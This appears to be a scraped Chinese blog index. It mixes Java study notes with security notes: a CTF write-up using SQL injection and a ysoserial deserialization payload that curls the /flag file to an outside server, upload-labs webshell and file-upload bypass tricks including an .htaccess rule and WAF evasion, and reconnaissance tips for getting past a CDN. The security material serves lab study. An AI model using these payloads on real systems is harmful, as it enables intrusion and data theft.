BigDecimal(&quot;15.156448946513165453&quot;);BigDecimal y = new BigDecimal(&quot;45.166431135&quot;) 加减乘除不能直接用传统的方法，要用下面的方法来进行 # 常见方法 add 12BigInteger add = bigInteger.add(b);BigDecimal add = bigdecimal.add(b); subtract：减 12BigInteger subtract = bigInteger.subtract(b);BigDecimal subtract = bigdecimal.subtract(b); multiply 12BigInteger multiply = bigInteger.multiply(b);BigDecimal multiply = bigdecimal.multiply(b); divide：除 12345BigInteger divide = bigInteger.divide(b);BigDecimal divide = bigdecimal.divide(b);//在除法中可能会出现无限循环小数，这里可以指定精度：BigDecimal.ROUND_CELINGSystem.out.println(&quot;bigDecimal.divide(b, a.ROUND_CELING)&quot;) # 日期类 Date：精确到毫秒 SimpleDateFormat：格式和解析日期的类。它允许进行格式化（日期 -&gt; 文本），解析（文本 -&gt; 日期）和规范化 12345678910111213Date d1 = new Date();//默认输出格式一般是国外的惯用格式，这里可以格式化SimpleDateFormat day = new SimpleDateFormat(&quot;yyyy年MM月dd日 hh:mm:ss E&quot;);String format = day.format(d1);System.out.println(&quot;当前日期为：&quot; + format);//可以通过毫秒数来指定此毫秒数对应的时间Date d2 = new Date(923898);System.out.println(&quot;d2=&quot; + d2);//还可以把一个格式化的String转换成对应的Date。(格式一定要正确)String s = &quot;1996年01月01日 10:20:30 星期一&quot;;Date parse = day.parse(s); # 第二代日期类 Calendar 类 1public abstract class Calendar extends Object implements Serializable, Cloneable, Comparable&lt;Calendar&gt; Calendar 类是一个抽象类，为 YEAR, MONTH, DAY_OF_MONTH, HOUR 等日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法 12345678910//Calendar是一个抽象类，且构造器是私有的，所以可以通过getInstance()来获取实例//这个就比较灵活，可以需要什么就get什么，随意组合Calendar c = Calendar.getInstance();System.out.println(c.get(Calendar.DAY_OF_WEEK));System.out.println(c.get(Calendar.YEAR));System.out.println(c.get(Calendar.MONTH) + 1);//月要加1，因为Calendar返回月的时候是从0开始编号的System.out.println(c.get(Calendar.DAY_OF_MONTH));System.out.println(c.get(Calendar.HOUR));System.out.println(c.get(Calendar.MINUTE));System.out.println(c.get(Calendar.SECOND)); # 第三代日期类 JDK 1.0 中包含了一个 java.util.Date 类，但它的大多数方法已经在 JDK 1.1 引入 Calendar 类后被弃用了，而 Calendar 类也存在一些问题 可变性：日期和时间这样的类应该是不可变的 偏移性：Date 中的年份是从 1900 年开始的，而月份都从 0 开始 格式化：格式化只对 Date 有用，Calendar 不可以 线程不安全，不能处理闰秒（每隔 2 天，多出 1s） # 第三代日期类常见方法 LocalDate (日期 / 年月日)、LocalTime (时间 / 时分秒)、LocalDateTime (日期时间) JDK8 加入 123456LocalDateTime ldt = LocalDateTime.now();System.out.println(ldt);System.out.println(ldt.getYear());System.out.println(ldt.getMonth());System.out.println(ldt.getDayOfMonth());System.out.println(ldt.getHour()); # 格式日期类 DateTimeFormatter 123//先创建一个DateTimeFormatter对象DateTimeFormatter dtf = DateTimeFormatter.ofPattern(&quot;yyyy年MM月dd日 HH小时mm分钟ss秒&quot;);String format = dtf.format(ldt) # 时间戳 类似于 Date，提供了一系列和 Date 类转换的方式 123456Instant now = Instant.now();//通过方法转换：//Instant --&gt; DateDate date = Date.from(instant);//Date --&gt; InstantInstant instant = date.toInstant(); # 更多方法 LocalDateTime 类 MonthDay 类：检查重复事件 是否是闰年 增加日期的某个部分 使用 plus 方法增加时间的某个部分 使用 minus 方法查看一年前和一年后的日期 # 集合（Collection） 集合主要是两组，即单列集合和双列集合。 Collection 接口有两个重要的子接口，List 和 Set，他们实现子类都是单列集合 Map 接口的实现子类是双列集合，存放 K-V 1234567ArrayList al = new ArrayList();al.add(&quot;jack&quot;);al.add(&quot;tom&quot;);HashMap hm = new HashMap();hm.put(&quot;No.1&quot;, &quot;tch&quot;);hm.put(&quot;No.2&quot;, &quot;hct&quot;); # 集合和数组的对比 数组： 长度开始时必须指定，且指定后就不能修改 保存的必须为同一类型的元素 使用数组进行增加元素的示意代码比较麻烦 而集合： 可以动态保存任意多个对象，使用比较方便 提供了一系列方便的操作对象的方法：add、remove、set、get 等 使用集合添加，删除新元素的示意代码，更加简洁 # Collection 接口和常用方法 # Collection 接口实现类的特点 public interface Collection&lt;E&gt; extends Iterable&lt;E&gt; Collection 实现子类可以存放多个元素，每个元素可以是 Object 有些 Collection 的实现类，可以存放重复的元素，有些不可以 Collection 的实现类，有些是有序的（List），有些是无序的（Set） Collection 接口没有直接的实现子类，是通过它的子接口 Set 和 List 来实现的 # Collection 接口常用方法 以实现子类 ArrayList 来演示 1List list = new ArrayList(); add：添加单个元素 123list.add(&quot;tch&quot;);list.add(10);list.add(true); remove：删除指定元素 12list.remove(0);//删除索引位置为0的元素list.remove(&quot;tch&quot;);//指定删除 contains：查找元素是否存在 1list.contains(&quot;tch&quot;); size：获取元素个数 1list.size(); isEmpty：判断是否为空 1list.isEmpty(); clear：清空 1list.clear(); addAll：添加多个元素 123ArrayList list2 = new ArrayList();list2.add(&quot;tch2&quot;);list.addAll(list2); containsAll：查找多个元素是否都存在 1list.containsAll(list2); removeAll：删除多个元素 1list.removeAll(list2); # Collection 接口遍历元素方式 # 使用 Iterator（迭代器） Iterator 对象称为迭代器，主要用于遍历 Collection 集合中的元素 所有实现了 Collection 接口的集合类都有一个 iterator () 方法，用以返回一个实现了 Iterator 接口的对象，即可以返回一个迭代器 Iterator 仅用于遍历集合，Iterator 本身并不存放对象 工作原理： 12345Iterator iterator = coll.iterator();//得到一个集合的迭代器//hasNext()判断是否还有下一个元素while(iterator.hasNext())&#123;//next()的作用：指针下移、将下移以后的位置上的元素返回 System.out.println(iterator.next());&#125;//快捷键itit 在调用 iterator.next () 方法之前必须要调用 iterator.hasNext () 进行检测，若不调用，且下一条记录无效时，直接调用 iterator.next () 会抛出 NoSuchElementException 异常 如果要再次使用，需要重置迭代器 iterator = coll.iterator(); # 使用 for 循环增强 增强 for 就是简化版的 iterator，本质一样，只能用于遍历集合或数组。底层其实就是迭代器 12for(Object object : col)&#123;&#125;//快捷键I # List 接口和常用方法 List 接口是 Collection 接口的子接口 List 集合类中元素有序（即添加顺序和取出顺序一致）且可重复 List 集合中的每个元素都有对应的顺序索引（索引从 0 开始） List 容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素 常用的 List 接口的实现类：ArrayList、LinkedList、Vector 12345678void add(int index, Object ele)//在index位置插入ele元素boolean addAll(int index, Collection eles)//从index位置开始将eles中的所有元素添加进来Object get(int index)//获取指定index位置的元素int indexOf(Object obj)//返回obj在集合中首次出现的位置int lastlndexOf(Object obj)//返回obj在当前集合中末次出现的位置Object remove(int index)//移除指定 indiex位言的完素，井返回此元Object set(int index, Object ele)//设置指定index位置的元素为ele，相当于是替换.List subList(int fromlndex, int tolndex)//返回从fromlndex到tolndex位置的子集合 List 和 ArrayList 的区别：Java 中 List 和 ArrayList 的区别及使用_java list arraylist-CSDN 博客 # ArrayList 的底层结构和源码分析 # 注意事项 permits all elements (可以放所有元素), including null。ArrayList 可以加入 null，并且可以加入多个 ArrayList 是由数组来实现数据存储的 ArrayList 基本等同于 Vector，除了 ArrayList 是线程不安全（但执行效率高），但在多线程情况下不建议使用 ArrayList # 源码分析 ArrayList 中维护了一个 Object 类型的数组 elementData. ［debug 看源码］transient Objectil elementData; 当创建 ArrayList 对象时，如果使用的是无参构造器，则初始 elementData 容量为 0，第 1 次添加，则扩容 elementData 为 10，如需要再次扩容，则扩容 elementData 为 1.5 倍 如果使用的是指定大小的构造器，则初始 elementData 容量为指定大小，如果需要扩容，则直接扩容 elementData 为 1.5 倍 # Vector 的底层结构和源码分析 # 注意事项 Vector 类的定义说明 12public class Vector&lt;E&gt; extends AbstractList&lt;E&gt;implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable Vector 底层也是一个对象数组， protected Object[] elementData; Vector 是线程同步的，即线程安全，Vector 类的操作方法带有 synchronized 在开发中需要线程同步安全的，考虑使用 Vector # 源码分析 创建对象时，如果使用的无参构造器，默认容量为 10，满了之后按照 2 倍扩容 创建对象时，如果是指定大小，则每次直接按照 2 倍扩容 # LinkList 的底层结构 LinkList 实现了双向链表和双端队列的特点 可以添加任意元素（可重复），包括 null 线程不安全，没有实现同步 # 底层操作机制 LinkList 底层是一个双向链表 LinkList 中维护了两个属性 first 和 last 分别指向首结点和尾结点 每个结点 (Node 对象) 里面有维护了 prev、next、item 三个属性，其中 prev 指向前一个，next 指向后一个，实现双向链表 所以 LinkList 的元素的添加和删除，不是通过数组完成的，效率较高 # ArrayList 和 LinkedList 的比较 如何选择： 改查多，选 ArrayList 增删多，选 LinkedList 一般来说在程序中，80％-90％都是查询，因此大部分情况下会选择 ArrayList 在一个项目中根据业务灵活选择，也有可能一个模块使用的是 ArrayList，另一个模块是 LinkedList # Set 接口和常用方法 无序，没有索引 不允许重复元素，所以最多包含一个 null JDK API 中 set 接口的实现类有 HashSet、TreeSet 等等 set 接口对象不能通过索引来获取，且没有 get 方法，所以不能用普通 for 循环遍历 # HashSet HashSet 实现了 Set 接口，可存放 null 但只能有一个 HashSet 实际上是 HashMap HashSet 不抱着元素是有序的，取决于 hash 后，在确定索引的结果 不能有重复对象 # 方法注意事项 add 方法在执行后会返回一个 boolean 值，如果添加成功返回 true，反之返回 false 可以通过 remove 指定删除对象 # HashSet 底层机制 HashSet 底层是 HashMap，HashMap 底层是数组 + 链表 + 红黑树 添加一个元素时，先得到 hash 值，再转成索引值 找到储存数据表 table，看这个索引位置是否已经存放的有元素 如果没有直接加入 如果有，就调用 equals 比较，如果相同就放弃添加，反之添加到最后 在 java8 中，如果一条链表的元素个数到达 TREEIFY_THRESHOLD (默认是 8)，且 table 的大小 &gt;=MIN_TREEIFY_CAPACITY (默认 64)，就会进行树化（红黑树） 扩容机制： 第一次添加时，table 扩容到 16，临界值 (threshold) 是 16 * 加载因子 (loadFactor)，加载因子 = 0.75，结果就是 12 如果 table 数组使用到了临界值 12，就会扩容到 16*2=32 ，新的临界值就是 32*0.75 ，以此类推 在 java8 中，如果一条链表的元素个数到达 TREEIFY_THRESHOLD (默认是 8)，并且 table 的大小 &gt;=MIN_TREEIFY_CAPACITY (默认 64)，就会进行树化（红黑树），否则仍然采用数组扩容机制 要注意的是，在一个 table 中只要添加了 0.75 倍的 Node，就会进行扩容，无论是添加到某个结点，还是某个结点的链表上 # LinkedHashSet LinkedHashSet 是 HashSet 的子类 LinkedHashSet 底层是一个 LinkedHashMap，底层维护了一个数组 + 双向链表 LinkedHashSet 根据元素的 hashCode 值来决定元素的储存位置，同时使用链表维护元素的次序 (图)，这使得元素看起来是以插入顺序保存的 LinkedHashSet 不允许添加重复元素 # TreeSet ////// # 图（Map） 12345Map map = new HashMap();map.put(&quot;no1&quot;, &quot;tch1&quot;);map.put(&quot;no2&quot;, &quot;tch2&quot;);map.put(&quot;no1&quot;, &quot;tch3&quot;);map.put(&quot;no3&quot;, &quot;tch1&quot;); Map 接口实现类的特点： Map 与 Collection 并列存在，用于保存具有映射关系的数据：Key-Value Map 中的 key 和 value 可以是任何引用类型的数据，会封装到 HashMap$Node 对象中 Map 中的 key 不允许重复，原因和 HashSet 一样（当 key 相同时，新的那个 key 的 value 会替换旧的 key 的 value） Map 中的 value 可以重复 Map 的 key 可以为 null，value 也可以为 null，但 key 为 null 只能有一个，而 value 可以有多个 常用 String 类作为 Map 的 key key 和 value 之间存在单向一对一关系，即通过指定的 key 能找到对应的 value（用 get 方法，通过 key 值查找） 一对 k-v 是放在一个 Node 中的，因为 Node 实现了 Entry 接口（有些书上说，一对 k-v 就是一个 Entry） # 对 Map.Entry 的解释 Map.Entry 是 Map 中的一个接口，他的用途是表示一个映射项（里面有 Key 和 Value），而 Set&lt;Map.Entry&lt;K,V&gt;&gt; 表示一个映射项的 Set。Map.Entry 里有相应的 getKey 和 getValue 方法，即 JavaBean，让我们能够从一个项中取出 Key 和 Value。 因为 Map 这个类没有继承 Iterable 接口，所以不能直接通过 map.iterator 来遍历，所以就只能先转化为 set 类型，用 entrySet () 方法，其中 set 中的每一个元素值就是 map 中的一个键值对，也就是 Map.Entry&lt;K,V&gt; 了，然后就可以遍历了。 Map 是 java 中的接口，Map.Entry 是 Map 的一个内部接口。 Map 提供了一些常用方法，如 keySet ()、entrySet () 等方法，keySet () 方法返回值是 Map 中 key 值的集合；entrySet () 的返回值也是返回一个 Set 集合，此集合的类型为 Map.Entry。 Map.Entry 是 Map 声明的一个内部接口，此接口为泛型，定义为 Entry&lt;K,V&gt;。它表示 Map 中的一个实体（一个 key-value 对）。接口中有 getKey (),getValue 方法 Node&lt;K,V&gt; 实现了 Entry 接口，Entry 接口中 K 表示 key, 即键，V 表示 value, 即值。Entry 即 Node 是 Map 集合中的一个对象元素，而 Map 集合正是由一个个 Entry 即 Node 对象所构成。 正是因为 Node 实现了 Entry 接口，所以使用 Entry 的时候也可以使用其 getValue () 和 getKey () 方法 Java 中 Map.Entry 详解_java map.entry-CSDN 博客 # Map 接口的常用方法 put：添加 remove：根据键删除 get：根据键获取 size：元素个数 isEmpty：判断是否为空 clear：清除 containsKey：查找键是否存在 # Map 接口遍历方法 containsKey：查找键是否存在 keySet：获取所有键 123456789101112//第一组：先取出所有key，再通过key取出对应的value Set set = map.keySet(); //(1)增强for for (Object key : set) &#123; System.out.println(key + &quot;:&quot; + map.get(key)); &#125; //(2)迭代器 Iterator iterator = set.iterator(); while (iterator.hasNext()) &#123; Object next = iterator.next(); System.out.println(next + &quot;:&quot; + map.get(next)); &#125; values：获取所有值 123456789101112//第二组：取出所有的value Collection values = map.values(); //(1)增强for for (Object value : values) &#123; System.out.println(value); &#125; //(2)迭代器 Iterator iterator2 = values.iterator(); while (iterator2.hasNext()) &#123; Object value = iterator2.next(); System.out.println(value); &#125; entrySet：获取所有关系 k-v 12345678910111213141516//第三组：通过EntrySet获取k-v Set entrySet = map.entrySet();//EntrySet&lt;Map.Entry&lt;K,V&gt;&gt; //(1)增强for for (Object entry : entrySet) &#123; //将entry对象转成Map.Entry Map.Entry m = (Map.Entry) entry; System.out.println(m.getKey() + &quot;:&quot; + m.getValue()); &#125; //(2)迭代器 Iterator iterator3 = entrySet.iterator(); while (iterator3.hasNext()) &#123; Object entry = iterator3.next(); //向下转型Map.Entry Map.Entry m = (Map.Entry) entry; System.out.println(m.getKey() + &quot;:&quot; + m.getValue()); &#125; # Hashtable 存放元素是键值对：k-v hashtable 的键和值哦都不能为 null hashTable 使用方法基本和 HashMap 一样 hashTable 线程安全，hashMap 线程不安全 # 底层 底层数组 Hashtable$Entry [] 初始化大小为 11 临界值 threshold 8 = 11 * 0.75 用方法 addEntry (hash, key, value, index) 添加 k-v，封装到 entry 当 if (count&gt;= threshold) 满足时进行扩容 # Properties properties 类继承自 Hashtable 类，且实现了 Map 接口，也是使用键值对来储存数据 使用特点和 Hashtable 类似 properties 可以用于从 xxx.properties 文件中加载数据到 Properties 类对象，并进行读取和修改 # 开发时如何选择","tags":["java"],"categories":["笔记"]},{"title":"博客迁移","path":"/2024/12/03/博客迁移/","content":"博客迁移","categories":["笔记"]},{"title":"think_java","path":"/2024/04/30/think-java/","content":"# sql 注入获取用户密码 首先打开 class 代码，在 test 中发现，在 /common/test/sqlDict 目录下有注入漏洞，同时也可以看到它调用了 swagger 模块 sqlDict 代码 抓一下包，以 post 形式注入，注意下注入点的路径 1dbName=myapp?a=&#x27;union+select+group_concat(name)from(user)# 1dbName=myapp?a=&#x27;union+select+group_concat(pwd)from(user)# 获取到了用户名以及密码 admin/admin@Rrrr_ctf_asde # swagger 模块 什么是 swagger 模块：swagger-ui 提供了一个可视化的 UI 页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署 UI 项目。 接口查看地址可以通过服务地址 /swagger-ui.html 访问 这里有三个部分，分别是获取当前用户信息，登录，以及数据库字典查询，刚才得到了数据库用户的信息。 # Java 反序列化 这里尝试登录 登录之后返回的数据是明显的 java 序列化后的值 java 序列化的特征： 一段数据以 rO0AB 开头，基本可以确定是 java 序列 base64 编码的数据 一段数据以 aced 开头，那么他就是这段 java 序列化的 16 进制 1Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu 这是 base64 编码后的序列化值，我们可以通过一个工具来看它在序列化之前是什么样的，我们要用到 SerializationDumper 这个工具，它在使用时需要用到 16 进制的序列化值，可以在网上先用 base64 转 16 进制工具转换一下，也可以用 python 脚本 1aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e SerializationDumper 使用命令：java -jar SerializationDumper.jar + 16 进制序列化 # java Deserialization Scanner java Deserialization Scanner 是一个 bp 的工具，可以扫描目标能用哪种方式进行反序列化攻击，可以直接在 bp 的插件商店里面安装，安装完之后要配置一下环境变量，写入 java 的路径以及等会要用到的工具 ysoserial 的路径 然后抓包发送到插件中，注意抓的包是反序列化注入点的包，也就是 &quot;获取当前用户信息&quot; 页面发送验证的请求包 选中序列化部分添加变量作为攻击点，选择 base64 编码的方式，然后 attack，攻击完之后可以看到 rome 模式是一个可攻击的点，所以在接下来用到 ysoserial 的时候，我们就用它的 rome 模块来创造 payload # ysoserial ysoserial 是一个集合了各种 java 反序列化 payload 的工具，这里我们用 rome 模块 使用命令如下，url 为公网服务器的地址 1java -jar ysoserial.jar ROME &quot;curl http://xxx.xxx.xxx.xxx:6150 -d @/flag&quot; &gt; tch.bin 这里会生成一个 payload 为 tch.bin，但是我们反序列化的注入点是需要 base64 格式的，我们直接拿生成的文件去一个在线文件转 base64 的网站转换一下就可以 复制下来，替换掉请求包序列化的内容 或者直接在 &quot;获取当前用户信息&quot; 页面中传入也是可以的 在公网服务器上监听端口（提前打开），然后获取到数据包，getflag","tags":["反序列化"],"categories":["wp"]},{"title":"uploadlabs笔记","path":"/2024/04/07/uploadlabs笔记/","content":"# 第 14 关 - 图片马 第 14 关的要求是上传图片马，也就是用图片加一段 php 代码，在网站有这个包含漏洞的情况下才可以解析这个木马 首先要制作一个图片马，可以直接用文本文档格式编辑，在图片后面加一段 php 代码，但是需要 16 进制编写。还可以用 cmd 生成，语句如下 1copy a.png /b + a.php /a webshell.png 在这个生成文件上传成功之后检测一下是否能成功运行，题目已经给了文件包含漏洞访问 找到文件上传之后的所在路径和文件名，用 bp 抓包看一下 然后在文件包含漏洞页面访问 # 第 15 关 - getimagesize () 这关和上一关只有一个区别，是一个 getimagesize 函数，这个函数会读取文件的 16 进制头，看是不是符合正常的图片的文件头，看看源码 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 所以只要文件头符合上述三个文件类型即可，其他步骤和 14 关一致 # 第 16 关 - exif_imagetype () 16 关和 14、15 关的思路依旧是一样的，但是这里的区别是 exif_imagetype，其功能是检测 16 进制文件头并检测其后缀名，功能和 getimagesize 一样，但是速度比其要快得多，在 php 扩展中可以打开这个功能 # 第 17 关 - 二次渲染 现在很多网站都会对用户上传的图片进行再次压缩、裁剪等渲染操作，比如 php 中的 imagecreatefromjpeg ()，所以普通的图片马基本上都会被渲染掉 # 绕过 GIF：在渲染前后的两张 GIF 不一样的数据块部分插入 webshell PNG：要将数据写入到 PLTE 数据块或者 IDAT 数据块 JPG：需要用脚本将数据插入到特定的数据块，而且可能不会成功，要多次尝试","tags":["文件上传"],"categories":["笔记"]},{"title":"文件上传漏洞","path":"/2024/04/05/文件上传漏洞/","content":"# 漏洞类型 # 常规类 扫描获取上传；会员中心上传；后台系统上传；各种途径 # 解析漏洞 apache；IIS6/7.X；nginx。IIS/7.X 和 nginx 是几乎一样的 # Apache 未知扩展名解析漏洞；AddHandler 导致的解析漏洞；HTTPD 换行解析漏洞 # 未知扩展名解析漏洞 apache 的解析漏洞依赖于一个特性，apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件内），则继续向左识别，直到识别到合法后缀才进行解析 x.php.xxx.yyy 识别最后的 yyy，如果不识别，就向前解析，直到识别 利用场景： 如果对方中间件 apache 属于低版本，我们可以利用这个文件上传上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中后门代码被触发 实战中可以上传 rar，owf 等文件进行利用，如果上传 phpinfo.php.jpg，即使文件名中有.php 也会直接解析为.jpg，因为 apache 认识.jpg，停止继续向左识别 # Nginx Nginx 配置文件错误导致的解析漏洞；Nginx 字节任意代码执行漏洞；等等 # Nginx 配置文件错误导致的解析漏洞 对于任意文件名，在后面添加 /xxx.php（xxx 为任意字符）后，即可将文件作为 php 解析。 例：info.jpg 后面加上 /xxx.php，会将 info.jpg 以 php 解析。 # CMS 漏洞 已知 cms 源码 # 编辑器漏洞 fckeditor；ckeditor；kindeditor # CVE 漏洞 CVE-2019-12615；CVE-2015-5254 # 验证 / 绕过 # 前端 js 类防护，前端验证代码可以直接删除 # 后端 # 黑名单 大小写绕过；点绕过；空格绕过；配合解析漏洞绕过；双后缀名绕过 # 特殊解析后缀 php3,php5 也可以解析为 php 同时不被拦截 # .htaccess 解析 .htaccess 文件中，用 filematch 函数进行对文件名的匹配 123&lt;FilesMatch &quot;\\.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这段代码的意思是，如果上传的文件名中有.jpg 这串字符，就以 php 文件来执行这个文件，由于网站没有对.htaccess 文件进行过滤，所以可以通过上传.htaccess 文件来对后续上传的文件进行一个绕过 # ::$DATA 绕过 在 window 的时候如果文件名加::$DATA 会把::$DATA 之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA 之前的文件名，他的目的就是不检查后缀名 例如:“phpinfo.php::$DATA&quot;Windows 会自动去掉末尾的::$DATA 变成&quot;phpinfo.php” # 循环过滤 有的验证代码只会验证一次，而不会循环验证 比如将 php 替换为空，在只有一次循环的情况下，‘a.php’会被替换为’a.’ ‘a.pphphp’就会被替换为’a.php’ 而多次循环不会出现这种情况 # 白名单 # MIME 绕过 修改文件类型 # %00 截断 我们上传 1.php%00.jpg 时，首先后缀名是合法的 jpg 格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg 格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到 %00 字符认为这是终止符，于是丢弃后面的.jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端 条件： php&lt;5.3.4 文件上传路径可控 …/upload/phpinfo.php%00/8220201011144424.jpg 实际上传的为 phpinfo.php 而不是.jpg 如果是以 post 形式上传要将 %00 url 解码一下，get 会自动解码 post 不会 # 其他 # 二次渲染下的条件竞争 由于有些网站的二次渲染，文件在上传之后会首先直接上传到缓存当中，然后再重新对文件进行验证，如果文件有害就删除，无害则进行二次渲染。 而在计算机中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。比如当我们在打开一个文档的时候，我们要对其进行删除操作，系统会提示当前程序正在运行无法删除 那么我们可以利用这一点，进行恶意文件的上传 我们可以利用 bp 的爆破工具不断上传一个文件，同时我们又不断发送访问这个文件的请求，如果这个文件被我们访问成功了，那么后台就无法删除这个文件，实现木马的上传 文件头检测 突破 getimagesize # 路径重命名 当上传文件的时，有的系统会自动重命名这个文件，然后保存在对应的路径下 UPLOAD_PATH . ‘/’ .$file_name; 那么我们可以这样写 upload/upload-19.php/. 代码在验证的时候验证的是 upload-19.php/. 而不是 upload-19.php，这样就绕过了对 php 的验证，而保存的时候还是只会保存 php 文件 # WAF 绕过 # 数据溢出 - 防匹配（xxx…） 在数据包填入大量无关数据导致 waf 功能失效 # 符号变异 - 防匹配（’ &quot; ;） 比如文件名为 &quot;a.php&quot;，可以把双引号去掉一个，写成 &quot;a.php，不要后面的双引号；或者直接去掉双引号；或者可以写成&quot;a&quot;.php;&quot;a&quot;a.php # 数据截断 - 防匹配（%00; 换行） “a.php&quot;写成&quot;a.php%00.jpg” or “a.php::$DATA.jpg” or “a.php;.jpg” or “a.jpg;.php” 这些不一定都能绕过，但也有可能绕过，具体情况具体分析判断 换行就是写成 “a . p h p” # 重复数据 - 防匹配（参数多次） 在 filename=&quot;a.php&quot; 之前，填入大量的其他 filename，比如 filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“a.php”; 或者将数据包整个一段填入 filename 中 将 Content-Disposition: form-data; name=“upload_file” filename=“x.php” Content-Type: image/jpeg 写成 Content-Disposition: form-data; name=“upload_file” filename=&quot;Content-Disposition: form-data; name=“upload_file&quot;x.php” Content-Type: image/jpeg 就是将 filename 之前的一段当作 filename 的值填入进去，类似于递归，数据包层面上看表面上是给了值，但实际上没有真正的值，但安全狗会认为已经有值填入了 或者还可以这样写 将 Content-Disposition: form-data; name=“upload_file” filename=“x.php” Content-Type: image/jpeg 写成 Content-Disposition: form-data; name=“upload_file” filename=“Content-Type: image/jpeg;x.php” Content-Type: image/jpeg 这里要注意，a.php 前要加分号，安全狗会认为到分号就结尾了，斜杠也可以起到类似于分号的作用，也就是说这里也可以写成 filename=“Content-Type: image/jpeg/x.php” 或者 filename=“Content-Type: image/jpegx/.php” # Fuzz 用 bp 导入 fuzz 字典进行爆破，但是因为速度太快可能会被拦截。也可以自己写字典然后倒入到里面去尝试，重要的是思路 # 安全修复 后端验证：采用服务端验证模式 后缀检测：基于黑名单，白名单过滤 MIMEM 检测：基于上传自带类型检测 内容检测： 文件头，完整性检测 自带函数过滤：参考 uploadlabs 函数 自定义函数过滤：function check_file () WAF 防护产品：宝塔，云盾，安全公司产品等","tags":["文件上传"],"categories":["笔记"]},{"title":"信息收集","path":"/2024/03/28/信息收集/","content":"# 有无 web 网站 通过多地 ping 工具判断有无 CDN，不同的情况根据不同的方法进行信息收集 # 有 CDN # 国外请求 从国外对内地 ping，因为如果不是有海外业务的公司一般是不会设置海外的 CDN 的，所以从海外 ping 它的网站可以直接连接到主服务器 https://tools.ipip.net/ping.php # 接口查询 查询网站的不同接口，每个接口对应着不同的功能，可以通过黑暗引擎搜集接口，找到目标的后台管理平台 # 黑暗引擎 https://fofa.info/ https://www.zoomeye.org/ https://www.shodan.io/ https://x.threatbook.com/ 等等 # 子域名 子域名可以通过 layer 等或者在线工具查询， 有的网站主域名会做 CDN，但是子域名可能不会做 二级域名和三级域名查到的结果可能不一样 主域名和子域名查询到的可能不一样 DNs 历史记录 = 第三方接口 (接口查询) 采集 / 国外请求 (同类型访问) 邮件源码测试对比第三方查询 (地区分析) 黑暗引擎 (shodan 搜指定 hash 文件) 扫全网 fuckcdn，w8 fuckcdn，zmap 等 工具扫描 认为判定，根据网站的域名备案推测 本地清下 dns，然后 hosts 里写上得到的 ip 和域名，如果是 cdn 可能会出现刷新异常，如果打开很快大概率是原机 # 其他 邮件服务查询：我们访问别人，可能通过 CND，但别人访问我们通常不会走 CDN 遗留文件，扫描全网 黑暗引擎搜索特定文件 dns 历史记录，以量打量：CDN 节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击 # 无 CDN # 程序源码 # 中间件 nignx，apache 等中间件漏洞 # 内部 / 位置 cms # 开源 cms wordpress，Z-Blog 等 cms 漏洞 # 站点搭建 # 目录站点 敏感文件 robots.txt、crossdomin.xml、sitemap.xml、源码泄漏文件 # 端口站点 端口扫描工具，nmap，masscan # 子域名站点 子域名扫描工具，oneforall，layer，teemo，nslookup 等 # 旁注 / C 类站点 旁站：是和目标网站在同一台服务器上的其它的网站，通过入侵安全性较差的旁站，之后可以通过提权跨目录等手段拿到目标服务器的权限。 工具：K8_C 段旁注工具、WebRobot、御剑、明小子 … C 段：每个 IP 有 ABCD 四个段，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务。比如 192.168.3.0-255 的设备都处于同一个 c 段 目标 ip 为 192.168.1.128，可以入侵 192.168.1.* 的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。 工具：Cain、Sniffit 、Snoop、Tcpdump、Dsniff … # 类域名站点 一个站点可以用多个域名 # 防护应用 WAF 安全狗，宝塔，云盾，安骑士 # 其他 # 有无 APP # 涉及 web # 不涉及 web # 尝试提取 抓包获取信息 # 逆向工程反编译 